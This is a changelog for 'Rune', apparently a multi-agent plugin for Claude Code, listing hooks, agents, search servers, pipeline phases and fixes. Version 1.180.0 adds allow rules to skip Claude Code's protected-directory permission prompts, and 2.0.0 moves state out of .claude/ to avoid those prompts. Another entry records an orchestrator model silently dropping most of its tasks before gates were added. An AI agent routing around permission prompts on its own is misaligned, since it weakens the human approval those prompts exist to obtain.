- **agents**: `wiring-cartographer` — maps integration points where new code connects to the existing system (entry points, layer architecture, registration patterns, dependency graph)
- **agents**: `activation-pathfinder` — traces activation and migration paths for new features (file creation order, configuration changes, migration steps)
- **agents**: `grace-warden` and `grace-warden-inspect` gain Step 2.5 Wiring Map Verification — checks Entry Points, Existing File Modifications, Registration & Discovery, and Layer Traversal tables
- **agents**: `WIRE-NNN` finding prefix for wiring verification findings (alongside existing GRACE-, RUIN-, SIGHT-, VIGIL- prefixes)
- **agents**: `verdict-binder` 9th gap category: `wiring` (WIRE- prefix, NOT auto-fixable)
- **devise**: Phase 1A now spawns both new research agents alongside repo-surveyor, echo-reader, and git-miner (up to 10 research agents total)
- **devise**: Phase 2 (Synthesize) consolidates integration research into `## Integration & Wiring Map` plan section (Standard and Comprehensive detail levels)
- **devise**: Phase 6 cleanup fallback array includes both new agents to prevent orphan processes
- **cost-tier**: Research category updated from 5 to 7 agents

### Changed
- **agents**: Gap categories expanded from 8 to 9 across verdict-binder, gap-fixer, inspect-scoring, verdict-synthesis, inspect SKILL.md
- **agents**: Finding dedup priority order updated: GRACE > WIRE > RUIN > SIGHT > VIGIL

## [2.1.8] - 2026-03-19

### Added
- **hooks**: `enforce-gh-account.sh` PreToolUse:Bash hook (GH-ACCOUNT-001) — auto-resolves correct GitHub account before `gh pr`, `gh issue`, `gh api`, `gh repo`, and `git push` commands when multiple accounts are authenticated
- **lib**: `gh-account-resolver.sh` — shared library for multi-account detection, access testing, and `gh auth switch` auto-switching
- **arc**: Account resolution in Phase 9 (ship) and Phase 9.5 (merge) before push/PR/merge operations
- **strive**: Account resolution in Phase 6.5 (ship) before push/PR creation
- **lib**: Account resolution in `pr-comment-poster.sh` before posting PR comments

## [2.1.7] - 2026-03-19

### Added
- **hooks**: `detect-stale-lead.sh` Stop hook — wakes idle team lead when all teammates have completed (STALE-LEAD-001)
- **hooks**: 4-method completion detection cascade (sentinel → count → TaskList → liveness) with session isolation and debounce
- **hooks**: Method D liveness check — detects crashed teammates (no processes but tasks in_progress) and wakes lead with warning
- **hooks**: Per-teammate status signals in `on-teammate-idle.sh` (`tmp/.rune-signals/{team}/status/`)
- **hooks**: Failure alert signals in `on-task-completed.sh` (`tmp/.rune-signals/{team}/alerts/`)
- **config**: `stale_lead_wakeup` talisman config section (enabled, debounce_seconds)

## [2.1.6] - 2026-03-19

### Fixed
- **arc**: Harden checkpoint config resolution — use `typeof === 'boolean'` for Layer 2 fields to reject non-boolean types and null propagation (RUIN-001, RUIN-002)
- **arc**: Add `bot_review`/`no_bot_review` to Layer 1 defaults for 3-layer consistency (GRACE-001, GRACE-002)
- **arc**: Remove redundant `??` fallback guards in checkpoint flags — Layer 2 already guarantees values (RUIN-003)
- **arc**: Use resolved `arcConfig.inspect_enabled` instead of raw talisman read for inspect toggle (RUIN-004)

## [2.1.5] - 2026-03-19

### Fixed
- **strive**: Implement graceful degradation for file infrastructure Write() calls — wrap all 4 Write() sites and 3 mkdir calls in forge-team.md with try/catch (AC-8, RUIN-001)
- **strive**: Convert SKILL.md verification gate from `throw` to `warn` — partial file creation no longer aborts the pipeline (RUIN-002)
- **strive**: Sanitize task.description in YAML frontmatter to prevent content injection (RUIN-004)

## [2.1.4] - 2026-03-19

### Fixed
- **strive**: Enforce physical task delegation with file-based protocol — prevents orchestrator from implementing tasks directly (#350)
- **hooks**: Prevent premature session termination during arc phases (#347)

### Changed
- **plugin.json**: Corrected agent count from 110 (66 core) to 111 (67 core)

## [2.1.3] - 2026-03-19

### Fixed
- **arc-phase-stop-hook**: Increase timeout from 15s to 30s — prevents silent arc death on large checkpoints with 20+ phases
- **arc-phase-stop-hook**: Optimize phase finding loop from O(N) jq forks to single jq call with fallback
- **arc-phase-stop-hook**: Fix silent `exit 0` on context-critical detection — now exits 2 with resume instructions (AC-4)
- **arc-phase-stop-hook**: Add crash recovery fast-path with `_FAST_PATH` flag (skips zombie cleanup after ERR trap timeout)
- **arc-phase-stop-hook**: Add `_jq_with_budget()` budget-aware jq wrapper with timeout guard
- **arc-phase-stop-hook**: Replace fragile sed with awk for compact_pending YAML field update
- **arc-phase-stop-hook**: Add `_HOOK_START_EPOCH` timing telemetry and hook execution summary in phase-log.jsonl
- **arc-stop-hook-common**: Enhanced ERR trap with crash signal file (`_crash_signal`) for diagnostics and recovery
- **arc-stop-hook-common**: Add symlink guard on crash signal WRITE path (RUIN-001)
- **detect-workflow-complete**: Add GUARD 2.5 checkpoint freshness check to prevent cleanup during arc phase transitions (AC-6)
- **detect-workflow-complete**: Add session-scoping to GUARD 2.5 via config_dir/owner_pid validation (RUIN-003)
- **on-teammate-idle**: Add team-specific idle thresholds — 600s for test agents (AC-7)
- **CLAUDE.md**: Update Stop hook timeout rationale from 15s to 30s

## [2.1.2] - 2026-03-19

### Fixed
- **arc config resolution**: Replace `??` with `!== undefined` for 12 boolean fields in `resolveArcConfig()` — fixes defense-in-depth gap where talisman boolean overrides could be silently ignored when shard resolution returns stale data (#344)

## [2.1.1] - 2026-03-19

### Added
- **arc completion stamp**: Enriched with full execution metadata — session identity, per-phase timing, quality metrics, changed files summary, plan relocation search
- **arc completion stamp**: Session ID, Owner PID, Rune Session ID, Rune Version fields
- **arc completion stamp**: Per-phase Duration column in Phase Results table
- **arc completion stamp**: Quality Metrics section (TOME P1/P2/P3, test pass rate, resume count)
- **arc completion stamp**: Changed Files section with collapsible diff stats (capped at 30 files)
- **arc completion stamp**: Plan file relocation search (STEP 1.5) for moved/archived plans
- **arc completion stamp**: Missing phases added to table (inspect, inspect_fix, verify_inspect, deploy_verify, drift_review)

### Fixed
- **arc completion stamp**: Use `checkpoint.session_id` instead of `Bash('echo $CLAUDE_SESSION_ID')` — env var unavailable in Bash context
- **arc completion stamp**: TOME P1/P2/P3 regex anchored to finding ID prefix to avoid false matches
- **arc completion stamp**: Fix const reassignment and undefined `checkpointPath` reference
- **arc completion stamp**: Add null guard for checkpoint fields, remove stale comment

## [2.1.0] - 2026-03-19

### Added

- **setup-worktree.sh**: Copy `CLAUDE.local.md` to worktree `.claude/` directory for project-local instructions
- **setup-worktree.sh**: Submodule detection advisory — warns when source repo is a git submodule (#29256)
- **setup-worktree.sh**: Bare repository detection advisory — warns about upstream hang (#27436)
- **setup-worktree.sh**: Disk space pre-flight check with 2x safety margin before worktree copy
- **setup-worktree.sh**: Model degradation context reinforcement via `WORKTREE_CONTEXT.md`
- **cleanup-worktree.sh**: New WorktreeRemove hook — salvages uncommitted changes as patch files before removal
- **agent-search**: Hardened MCP database path resolution for worktree environments
- **git-worktree SKILL.md**: Added Known Limitations (Upstream) section documenting 6 known limitations

### Fixed

- **worktree-resolve.sh**: Fix submodule false positive — parse `.git` file gitdir path to distinguish `/.git/worktrees/` from `/.git/modules/`

## [2.0.4] - 2026-03-18

### Fixed

- **arc-heartbeat-writer.sh**: Move shared library sourcing (platform.sh, rune-state.sh) before RUNE_STATE usage to prevent undefined variable errors
- **context-percent-stop-guard.sh**: Move shared library sourcing before RUNE_STATE usage (same fix)
- **torrent/install.sh**: Fix release tag resolution to use prefixed `torrent-vX.Y.Z` tags instead of `releases/latest` which could match wrong release stream

## [2.0.3] - 2026-03-18

### Fixed

- **echo-search start.sh**: Fix PLUGIN_ROOT path calculation (was one level up instead of two)
- **figma-to-react start.sh**: Fix same PLUGIN_ROOT path calculation bug
- Both MCP servers now correctly resolve `${PLUGIN_ROOT}/scripts/lib/rune-state.sh`

## [2.0.2] - 2026-03-18

### Fixed

- **agent-search SEC-005**: Add defensive post-sanitization check for FTS search terms
- **build-talisman-defaults**: Add type annotations to injection functions
- **echo-search decomposer**: Optimize TTL cache eviction with front-scan instead of full iteration
- **echo-search server**: Use `executemany` for batch index rebuilds, compile token regex, add column allowlist for group-by queries, narrow exception handling for global conn cleanup
- **enforce-glyph-budget**: Add `nullglob` protection for state file glob iteration
- **sensitive-patterns**: Fix bash 3.2 compatibility for associative array declaration
- **on-teammate-idle**: Parse team session file as JSON instead of raw text

### Removed

- **`.claude/talisman.yml`**: Remove redundant project-root talisman (already exists under `plugins/rune/`)

## [2.0.1] - 2026-03-18

### Fixed

- **Migration hardening**: Add `mkdir`-based atomic lock to prevent concurrent migration race (SEC-003)
- **Migration error logging**: Replace silent `mv 2>/dev/null` with `_migrate_item()` helper that logs failures (BACK-001)
- **SQLite WAL symlink check**: Add `[[ ! -L ]]` guard on `-shm` and `-wal` companion files (SEC-006)
- **SQLite rollback logging**: Log rollback failures instead of silently swallowing (BACK-002)
- **Trace log symlink guard**: Add symlink check in `validate-inner-flame.sh` and `validate-discipline-proofs.sh` (SEC-007)
- **Discipline proof containment**: Check both `.claude/` and `.rune/` in `execute-discipline-proofs.sh` (QUAL-001)
- **validate-gap-fixer-paths.sh**: Add missing `source rune-state.sh` (BACK-005)
- **stop-hook-common.sh**: Add `.claude/` fallback for worktree marker detection (QUAL-005)
- **rune-status.sh**: Add legacy `.claude/arc/` fallback for checkpoint scanning (QUAL-004)
- **Torrent TUI**: Add `.claude/` fallback in `read_arc_loop_state()` for pre-migration arcs (FLAW-003)

### Added

- `RUNE_LEGACY_SUPPORT_UNTIL="3.0.0"` deprecation constant in `rune-state.sh` (ARCH-002)
- Improved `_rune_ensure_dir()` with failure logging and explicit `return 1`

## [2.0.0] - 2026-03-18

### Changed

- **State directory migration**: All Rune workflow state moved from `.claude/` to `.rune/`
  - Arc checkpoints: `.claude/arc/` → `.rune/arc/`
  - Echoes: `.claude/echoes/` → `.rune/echoes/`
  - Talisman config: `.claude/talisman.yml` → `.rune/talisman.yml`
  - Audit state: `.claude/audit-state/` → `.rune/audit-state/`
  - Loop state files, worktrees, search indexes: all under `.rune/`
  - **Auto-migration**: Existing `.claude/` state is automatically moved on first session start via `_rune_migrate_legacy()` in `lib/rune-state.sh`
  - **Motivation**: Claude Code v2.1.78 marks `.claude/` as protected; `.rune/` eliminates permission prompts
  - **Talisman fallback**: `.rune/talisman.yml` is primary; `.claude/talisman.yml` is read as fallback with deprecation warning

### Added

- New library: `lib/rune-state.sh` — shared shell library for Rune state directory resolution (`RUNE_STATE`, `RUNE_STATE_ABS`, `_rune_ensure_dir()`, `_rune_migrate_legacy()`)
- New reference: `lib/rune-state-skill.md` — skill-level constant reference for `.rune/` paths

## [1.180.0] - 2026-03-18

### Added
- **Plan: `.rune/` state directory migration** — comprehensive plan to move all Rune workflow state from `.claude/` (protected in Claude Code v2.1.78) to `.rune/` at project root. Includes `lib/rune-state.sh` shell library, auto-migration, talisman dual-path fallback. Plan: `plans/2026-03-18-refactor-rune-state-dir-migration-plan.md`
- **Torrent: plan rescan on `p` key** — pressing `p` (PickPlans) now rescans `plans/` to discover newly created files. Existing queue entries are safely remapped via filename matching
- **Torrent: dead PID session filter** — `scan_active_arcs` now skips sessions with dead owner PIDs instead of displaying stale entries
- **Permission rules for `.claude/` writes** — added `Write(.claude/**)` and `Edit(.claude/**)` to `settings.local.json` to work around v2.1.78 protected directory prompts (interim fix until `.rune/` migration)

## [1.179.0] - 2026-03-18

### Added
- New skill: `cc-inspect` — Claude Code runtime environment inspector with 6 diagnostic sections (session, env, system, plugin, runtime, echoes)
- New script: `cc-inspect.sh` — comprehensive CLI diagnostic for session identity, env vars, toolchain versions, plugin system, Rune runtime state, and echoes

### Fixed
- **TLC-001/002**: Standardize retry delays to canonical `[0, 3000, 6000, 10000]` (19s) across 30+ files — was `[0, 5000, 10000, 15000]` (30s) due to copy-paste drift from engines.md
- **CLEAN-001**: Fix fallback name `inspect-lore-analyst` → `lore-analyst` in verdict-synthesis.md
- **CLEAN-002**: Remove stale `runebinder-deep`, `runebinder-merge` from roundtable fallback array
- **DPMT-001/002**: Remove phantom agent names (`pattern-weaver`, `glyph-scribe`, `design-inventory-agent`) from known-rune-agents.sh
- **BACK-001**: Add subprocess cleanup in OSError handler in decomposer.py
- **BACK-002**: Add warning log for gradient stroke fallback in style_builder.py
- **BACK-003**: Add Figma node ID format validation in figma_client.py
- **SPAWN-001/002/003**: Add `team_name` to Agent examples in ash-guide and spec-continuity.md
- **DOC-001**: Update README.md version badge from 1.175.2 to 1.179.0
- **EDGE-001**: Add clock skew guard for artifact age in detect-workflow-complete.sh
- **EDGE-002**: Add empty string/invalid mtime guard in arc-heartbeat-writer.sh
- **EDGE-003**: Add zero mtime guard for checkpoint age in on-session-stop.sh (matching FLAW-003 pattern)
- **EDGE-004**: Change `exit 0` to `continue` for invalid mtime in detect-workflow-complete.sh loop
- **EDGE-005**: Add dotfile allowlist (.gitignore, .dockerignore, .eslintrc, .prettierrc, .editorconfig) in validate-gap-fixer-paths.sh
- arc: Enriched completion stamp with full execution metadata (session identity, per-phase timing, quality metrics, changed files summary, plan relocation search)
- arc: Session ID, Owner PID, Rune Session ID, and Rune Version fields in completion record
- arc: Per-phase Duration column in Phase Results table (human-readable format)
- arc: Quality Metrics section with TOME P1/P2/P3 counts, test pass rate, resume count, target branch
- arc: Changed Files section with collapsible `<details>` diff stats (capped at 30 files)
- arc: Plan file relocation search (STEP 1.5) — finds moved plans in archived/, deleted/, skip/, defer/, shattering/
- arc: Missing phases added to completion stamp table: inspect, inspect_fix, verify_inspect, deploy_verify, drift_review
- arc: `Number.isFinite()` guard and `Math.max(0, ...)` floor for duration formatting
- arc: `defaultBranch` validation before shell interpolation (command injection prevention)
- arc: TOCTOU protection with try-catch around STEP 4 Read after relocation search
- arc: Checkpoint persistence after plan relocation (AC-7 cross-session support)
- arc: Use `checkpoint.session_id` instead of `Bash('echo $CLAUDE_SESSION_ID')` — env var not available in Bash context (#25642)
- arc: TOME P1/P2/P3 regex anchored to finding ID prefix to avoid false matches in headers/code blocks

## [1.178.0] - 2026-03-18

### Added
- feat: PR Comment Output — post review/audit findings to GitHub PR comments via `/rune:post-findings`
- New skill: `/rune:post-findings` — parses TOME, formats markdown, posts to PR via `gh` CLI
- New scripts: `tome-parser.sh`, `pr-comment-formatter.sh`, `pr-comment-poster.sh`
- New talisman section: `pr_comment` — configurable severity filter, confidence threshold, format, collapse behavior
- Arc Phase 8.5 integration: auto-post findings after review phases when `pr_comment.enabled: true`

## [1.177.0] - 2026-03-17

### Added
- arc: `generateTestStrategy()` inline pseudocode in `arc-phase-test.md` — 6-section template matching `test-strategy-template.md`
- arc: Phase 7.9 `deploy_verify` row in SKILL.md phase table
- arc: Wire `visual-regression.md` reference in `arc-phase-test.md` E2E section
- arc: `--status` flag for mid-pipeline progress checking (delegates to `rune-status.sh`)

### Fixed
- arc: Replace 2 inline polling loops in `arc-codex-phases.md` with proper `waitForCompletion()` calls (POLL-001 fix)

## [1.176.0] - 2026-03-17

### Added
- Talisman semantic validation script (`validate-talisman-consistency.sh`) with 6 cross-field checks: TC-001 (max_ashes capacity), TC-002 (source: local resolution), TC-003 (source: plugin resolution), TC-004 (context_budget total), TC-005 (dimension agent cap), TC-006 (dedup hierarchy orphans)
- Talisman audit Phase 2.7: Semantic Consistency Validation — runs `validate-talisman-consistency.sh` during `/rune:talisman audit`

### Fixed
- Fix `max_ashes: 10` → `13` to accommodate 7 built-in + 5 custom agents + 1 buffer
- Fix `phantom-warden` source: `local` → `plugin` (agent file lives in `registry/review/`, not `.claude/agents/`)
- Reduce custom agent `context_budget` from 25 → 15 each (total 130% → 80%)
- Add `max_dimension_agents` buffer: 7 → 8

## [1.175.3] - 2026-03-17

### Changed
- Inline diff-scope-awareness instructions into 10 investigation agents + ward-sentinel (remove cross-file reference dependency)
- Update README agent counts: 109→106 agents, utility 23→19 (removed 4 retired condenser agents)
- Minor fixes across codex-cli, context-weaving, debug, devise, forge, resolve-todos, roundtable-circle, and testing skill references

## [1.175.2] - 2026-03-17

### Added
- discipline: DSR (Design Spec-compliance Rate) 6-dimension breakdown in metrics-schema.md JSON schema — token_compliance, accessibility, variant_coverage, story_coverage, responsive, fidelity
- discipline: DSR added to Metric Relationships diagram as sibling to SCR, validity rule for design_sync_enabled constraint, See Also links to design-proof-types.md and design-convergence.md
- discipline: design_sync.discipline talisman configuration section in plugin-root talisman.example.yml — dsr_threshold, proof_types, advisory mode defaults
- devise: Acceptance criteria quality validation (check c2) in plan-review.md Phase 4B.5 — validates YAML AC blocks against 14 registered proof types with severity mapping (HIGH/WARN/INFO)

## [1.175.1] - 2026-03-17

### Fixed
- **fix(discipline): align F-codes with canonical registry** — F9→F8 (INFRASTRUCTURE_FAILURE) in gap-fixer, mend-fixer, testing SKILL, and arc-phase-test to match canonical failure-codes.md (F9 is RESERVED). Added cross-references to failure-codes.md in all 4 files.
- **fix(discipline): standardize talisman discipline config path** — All discipline config reads now use `readTalismanSection("settings")?.discipline` (no dedicated discipline shard). Fixed pre-ship-validator, storybook-verification, and work-loop-convergence.
- **fix(discipline): resolve 11 inspect findings from Shard 8 verdict** — SIGHT-001: `criteriaConverged` now participates in verdict override (dual convergence gate). VIGIL-001: echo-back instruction injected into batch runner prompt. RUIN-001: F3/F8 classification heuristic added. GRACE-001: evidence directory uses resolved path. RUIN-002: F17 signature normalized. RUIN-004: filesystem evidence check in mend Phase 5.96. GRACE-002: criterion matching window 40→60 chars. Plus documentation fixes for RUIN-003, SIGHT-002, SIGHT-003, VIGIL-003.

## [1.175.0] - 2026-03-17

### Added
- **feat(discipline): design discipline shard 9 — design-aware proof system** — Complete design discipline integration across 6 tasks:
  - **T9.1**: Design acceptance criteria format (DCD/VSM YAML `acceptance_criteria` field, DES-{component}-{dimension} prefix convention, auto-generation from VSM dimensions)
  - **T9.2**: Design proof executor (`execute-discipline-proofs.sh` handles 6 design proof types: `token_scan`, `story_exists`, `axe_passes`, `storybook_renders`, `screenshot_diff`, `responsive_check` with F4 graceful degradation for unavailable tools)
  - **T9.3**: Storybook verification phase (Phase 3.3) enhanced with discipline proof integration, DES- criteria matrix output, and ward checks
  - **T9.4**: Design evidence collection for workers (Step 6.76 in rune-smith and trial-forger templates, conditional DES- echo-back, design-evidence.json output)
  - **T9.5**: Design fidelity convergence (criteria-based primary gate + score threshold secondary gate, F10 regression detection, F17 stagnation detection, design-criteria-matrix-{iteration}.json artifacts, design-convergence-report.json)
  - **T9.6**: Talisman design discipline config (`design_sync.discipline` nested section with proof_types auto-detect), DSR metric alongside SCR in metrics-schema.md, design_compliance section in proof manifest with per-component breakdown

## [1.174.0] - 2026-03-17

### Added
- **feat(discipline): arc pipeline discipline wiring (shard 8 of 9)** — Wire discipline enforcement into 8 additional arc phases. Forge criteria guard (Phase 1) validates acceptance criteria quality post-enrichment. Task decomposition criteria coverage assertion (Phase 4.5) verifies no criteria silently dropped. Remediation evidence collection (Phases 5.8, 7) in gap-fixer and mend-fixer agents with proof-schema.md reference. Spec-aware test discipline (Phase 7.7) with echo-back for test strategy, F-code classification (F3/F8/F17) in fix loops, and plan context for failure analyst. Spec-aware test coverage critique (Phase 7.8) evaluates both code coverage and spec coverage. Proof manifest generation at pre-ship validation (Phase 8.5) persisted as PR comment at merge. Dual convergence gate in verify-mend (Phase 7.3) checks both findings AND criteria dimensions with regression detection (F10).

## [1.173.0] - 2026-03-17

### Added
- **feat(torrent): Rust TUI arc orchestrator** — Standalone Rust TUI tool for managing `rune:arc` execution across tmux sessions. Scans config dirs for plans, provides ordered multi-select plan picker, manages tmux session lifecycle (create/kill/recreate), discovers arc checkpoints, monitors heartbeats, and executes plans sequentially. Modules: main, app, ui, scanner, tmux, monitor, checkpoint, keybindings.
- **feat(torrent): session identity verification and PID tracking** — Strict 4-field checkpoint matching (`config_dir` + `owner_pid` + `plan_file` + `started_at`) prevents picking up stale checkpoints. Captures Claude Code PID via `tmux pane_pid` → `pgrep -P` chain. Displays TMUX session ID, CCPID, and CCID in TUI.
- **feat(torrent): Makefile and clippy fixes** — Build, release, test, check, clean, install targets. Fixed clippy warnings: redundant closures, useless `format!`, `for_kv_map`, unnecessary `map_or`.
- **feat(discipline): deep-verification (shard 6 of 9)** — Failure code classification (F1-F17) with detection heuristics, judge-model semantic proof verification via `claude --model haiku`, work-loop convergence protocol (entry/exit conditions, stagnation F17, regression F10, budget F15), context isolation hook (`validate-context-isolation.sh` DISCIPLINE-CTX-001), and accountability echoes protocol for discipline echo tracking.
- **feat(discipline): field-hardening (shard 7 of 9)** — Promotes four field-observed patterns to runtime-enforced: evidence-first invariant enforcement (phantom completion detection), stochastic budget in metrics/convergence (WITHIN_BUDGET/OVER_BUDGET), token-cost IPC accounting principles in spec-continuity (5 principles with anti-pattern examples), silent backpressure detection in glyph budget hook (response length trend tracking).

## [1.172.0] - 2026-03-16

### Added
- **feat(agent-search): extra agent sources — `.claude/rune-agents/` and `extra_agent_dirs`** — Agent search now scans 6 sources (up from 4). New `rune-project` source (priority 70) scans `.claude/rune-agents/` for search-only agents that are NOT auto-loaded by Claude Code — ideal for cataloging agents from other plugins without polluting the auto-discovery namespace. New `external` source (priority 60) scans arbitrary directories configured via `extra_agent_dirs` in talisman.yml. Both support nested folders with automatic category inference from directory names (e.g., `review/python.md` → `category: review`). SEC containment check ensures paths stay within project or `$HOME`.

## [1.171.0] - 2026-03-16

### Fixed
- **fix(agent-search): startup indexing bug** — MCP server started with empty FTS5 index because auto-reindex only triggered on search calls (chicken-and-egg). Added `_startup_index_if_empty()` that checks agent count on server launch and builds initial index if needed (~55ms for 113 agents). Fail-forward: indexing errors don't prevent server startup.

### Added
- **feat(workflows): MCP-first agent discovery for all standalone skills** — Wired `agent_search()` into 10 skill reference files: devise (research-phase, plan-review, goldmask-prediction, solution-arena), strive (worker-prompts, test-phase), mend (fixer-spawning), debug (SKILL.md), codex-review (phase1-setup). Each skill now queries agent-search MCP before spawning, enabling user-defined agents to participate in workflows. Falls back to hardcoded defaults when MCP unavailable.
- **feat(arc): MCP-first agent discovery for all arc design/UX/inspect phases** — Wired `agent_search()` into 7 arc phase reference files: design-extraction, design-prototype, design-iteration, storybook-verification, ux-verification, plan-review (inspector discovery), gap-analysis (inspector discovery). Fixed asymmetrical documentation in plan-review and gap-analysis where agent_search pattern was documented but not implemented.
- **chore: gitignore agent-search SQLite DB files** — Added `.claude/.agent-search-index.db`, `-shm`, `-wal` to `.gitignore`.

## [1.170.0] - 2026-03-16

### Added
- **feat: Agent Registry Phase 3-5 — prompts/ash migration, registry directory, workflow integration**
  - **prompts/ash/ migration (Task 1.2)** — Eliminated the entire `prompts/ash/` directory (32 files):
    - Group A: Merged 15 team-workflow protocols into corresponding `agents/` bodies as conditional "Team Workflow Protocol" sections. Runtime `{variable}` placeholders replaced with `<!-- RUNTIME: ... -->` comments.
    - Group B: Created 8 new mode-variant agent files (`grace-warden-inspect`, `grace-warden-plan-review`, etc.) as standalone agents in `agents/investigation/`.
    - Group C: Created 5 new agents (`gap-fixer`, `forge-warden`, `shard-reviewer`, `veil-piercer`, `verdict-binder`). Moved 4 skill-scoped templates to `skills/*/references/`.
    - Updated 20+ skill reference files to eliminate all `prompts/ash/` paths.
  - **registry/ directory (Task 2.5)** — Created `registry/` with 8 subdirectories. Moved 43 EXTENDED+NICHE tier agents from `agents/` to `registry/` (MCP-only, zero context overhead). Result: 66 CORE agents in `agents/` (~3,630 tokens), 43 EXTENDED in `registry/` (0 tokens). ~45% context reduction.
  - **Workflow integration (Tasks 3.1-3.6)** — Added MCP-first `agent_search()` discovery to all workflow skills:
    - Rune Gaze: 5-step MCP-first pipeline (phase search, stack supplemental, UX supplemental, dedup, signal)
    - Ash summoning: Dual-path spawning for CORE (subagent_type) vs EXTENDED/USER (general-purpose + body injection)
    - Arc phases: MCP-first notes for code-review, plan-review, gap-analysis
    - Forge Gaze: MCP-first topic discovery for enrichment
    - Inspect: MCP-first inspector discovery with fallback to 4 hardcoded inspectors
    - Goldmask: MCP-first tracer discovery with fallback
  - **User agent support (Task 4.1)** — Added `ashes.user_agents[]` example to `talisman.example.yml`
  - **Infrastructure** — Updated `build-agent-registry.sh`, `known-rune-agents.sh`, agent counts in CLAUDE.md/README.md/plugin.json

### Changed
- Agent count: 98 → 109 (66 CORE + 43 EXTENDED). Net new: 13 agents from Groups B/C.
- Context overhead: ~5,324 tokens → ~3,630 tokens (~32% reduction)
- All workflow skills now support MCP-first agent discovery with backward-compatible fallback

## [1.169.0] - 2026-03-16

### Fixed
- **fix(arc): task completion gate prevents shipping incomplete implementations** — Gap analysis (Phase 5.5) now extracts individual plan tasks (`### Task X.Y:` headings), cross-references against committed files, and enforces a hard completion floor (default: 100%). Previously, gap analysis only checked acceptance criteria keywords via grep — which could pass even when 60% of tasks were unimplemented (PR #310 incident: shipped 40% completion).
  - **STEP D.0 (Task Completion Gate)**: Deterministic, always active, non-bypassable. Parses plan tasks, extracts `**Files**:` patterns, detects deletion/migration tasks, calculates completion %. Configurable floor via `arc.gap_analysis.task_completion_floor` (default: 100%, range: 50-100).
  - **STEP D.7 (Plan Writeback)**: Writes implementation status back to plan file after gap analysis. Deferred tasks MUST have explicit justification — no silent deferrals. Plan becomes living document with arc run history.
  - **Gap remediation task support**: When tasks are missing, gap_remediation (Phase 5.8) now spawns workers to implement missing plan tasks (not just FIXABLE findings).
  - **Pre-ship validator BLOCK gate**: New `task_completion` gate in pre-ship validator (Phase 8.5) BLOCKS ship when task completion is below floor. Previously, pre-ship validator NEVER halted the pipeline.
  - **Default changes**: `halt_on_critical` changed from `false` to `true`. `halt_threshold` raised from 50 to 70.
- **fix(strive): task coverage assertion prevents silent task deferral** — Strive Phase 0 now verifies ALL plan tasks (`### Task X.Y:` headings) are covered by extracted work items. Missing tasks are auto-created from plan content with dependencies preserved. Default floor: 100% (configurable via `work.task_coverage_floor`). Previously, LLM orchestrator could silently drop 13 of 18 tasks by self-selecting only "easy" ones.

## [1.168.1] - 2026-03-16

### Fixed
- **fix: MCP SDK version requirement** — `requirements.txt` required `mcp>=2.10.0` which doesn't exist on PyPI (max 1.26.0). Changed to `mcp>=1.0.0`. This blocked both `agent-search` and `echo-search` MCP servers from starting on fresh venv installs.
- **fix: start.sh version detection** — `agent-search/start.sh` and `echo-search/start.sh` now use `importlib.metadata.version('mcp')` for reliable SDK version logging instead of `getattr(mcp, '__version__', 'unknown')` which always returned `'unknown'`.
- **fix: testing skill not injected into test runner agents** — All 6 testing agents (`unit-test-runner`, `integration-test-runner`, `e2e-browser-tester`, `contract-validator`, `extended-test-runner`, `test-failure-analyst`) now include `skills: [testing]` in frontmatter. Additionally, `e2e-browser-tester` gets `agent-browser` skill. Previously, test runners had no access to the testing skill's orchestration knowledge.
- **fix: broken link in fidelity-scoring.md** — `anti-slop-guardrails.md` link pointed to same directory instead of `../../frontend-design-patterns/references/anti-slop-guardrails.md` where the file actually lives.
- **fix: broken links in roundtable-circle SKILL.md** — Removed dangling references to `references/todo-generation-phase.md` and `references/todo-generation.md` (files never created). Redirected to `references/orchestration-phases.md` which contains the relevant content.

## [1.168.0] - 2026-03-16

### Added
- **feat: Agent Registry & Discovery System** — Phase 1-2 implementation of intelligent agent selection infrastructure
  - **agent-search MCP server** (`scripts/agent-search/server.py`) — SQLite FTS5 full-text search over all agent definitions with hybrid scoring (BM25 0.4 + tag match 0.3 + phase match 0.2 + category match 0.1). 5 tools: `agent_search`, `agent_detail`, `agent_register`, `agent_stats`, `agent_reindex`. Phase-aware, category-aware, source-aware filtering. Supports 1000+ agents with zero context overhead increase.
  - **Agent metadata schema** — Extended YAML frontmatter on all 96 agent `.md` files with `categories`, `primary_phase`, `compatible_phases`, `tags`, `source`, and `priority` fields. Enables deterministic pre-filtering for agent selection.
  - **build-agent-registry.sh** — Single-pass awk-based index builder that extracts metadata from all agent definitions into `tmp/.agent-registry.json`. Zero external dependencies beyond awk/jq.
  - **enforce-agent-search.sh** — AGENT-SEARCH-001 advisory hook. Detects when LLM spawns Rune teammates without calling `agent_search()` MCP first. Non-blocking (`additionalContext` only). Suppressed when MCP server unavailable. OPERATIONAL classification (fail-forward).
  - **Auto-reindex hooks** — `annotate-dirty.sh` (PostToolUse) marks index dirty on agent file edits; `reindex-if-stale.sh` (PreToolUse) triggers reindex before stale searches. Reuses echo-search dirty-signal pattern.
  - **Search-called signal** — `agent_search()` writes `tmp/.rune-signals/.agent-search-called` for enforcement hook detection.

## [1.167.0] - 2026-03-16

### Fixed
- **fix: context-aware post-completion advisory** — `advise-post-completion.sh` now reads actual context usage % from statusline bridge file instead of showing a fixed "context exhaustion" warning. Low usage (<50%) shows encouraging message, high usage (>70%) recommends fresh session, bridge unavailable shows generic message. Uses explicit jq null check to handle `used_pct: 0` correctly (FLAW-015).
- **fix: stale inscription ATE-1 false positives** — `enforce-teams.sh` Signal 2 now uses 3-layer ownership check: (1) direct `config_dir`/`owner_pid`/`session_id` from inscription.json, (2) tightened 30-min age threshold (down from 120 min), (3) team `.session` fallback for legacy inscriptions. Eliminates false-positive Agent() blocks from stale inscription files left by previous sessions.
- **fix: stale 200K reference** — `shard-allocator.md` now uses "teammate context window" instead of hardcoded "200K"

### Changed
- **inscription ownership fields** — `inscription.json` now includes `config_dir`, `owner_pid`, `session_id` (optional, backward compatible). Updated schema, protocol docs, and 5 inscription creation sites (orchestration-phases, forge-team, fixer-spawning, forge-enrichment-protocol, orchestration-protocol).

## [1.166.0] - 2026-03-15

### Changed
- **refactor: skill context optimization — reduce bloat, deduplicate, restructure**
  - Extract 32 ash-prompt templates from `roundtable-circle/references/ash-prompts/` to shared `prompts/ash/` directory
  - Update 20 consumer files across 7 skills with corrected reference paths
  - Deduplicate cleanup protocol in 11 skill reference files (replace inline 5-component protocol with stubs referencing `engines.md`)
  - Net reduction: ~360 lines of duplicated protocol code

## [1.165.0] - 2026-03-15

### Changed
- **refactor(testing): replace background agents with batched foreground execution** — Replaced background agent spawning in testing phase with batched foreground execution for improved reliability and deterministic completion detection (#307)

## [1.164.0] - 2026-03-15

### Changed
